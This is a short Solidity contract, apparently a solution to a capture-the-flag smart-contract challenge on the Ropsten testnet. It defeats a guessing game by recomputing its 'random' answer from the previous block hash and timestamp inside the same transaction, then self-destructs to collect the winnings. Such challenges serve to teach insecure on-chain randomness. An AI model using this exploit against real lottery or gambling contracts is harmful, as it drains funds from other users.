pragma solidity ^0.4.21;

import "./a.sol";

// ropsten: 0xc9AFAA0B523e50948D33AAea0525b31dB725402d

contract AlwaysWin {
    constructor(address lottery) public payable {
        GuessTheNewNumberChallenge g = GuessTheNewNumberChallenge(lottery);
        
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        
        g.guess.value(1 ether)(answer);
        
        selfdestruct(msg.sender);
    }
}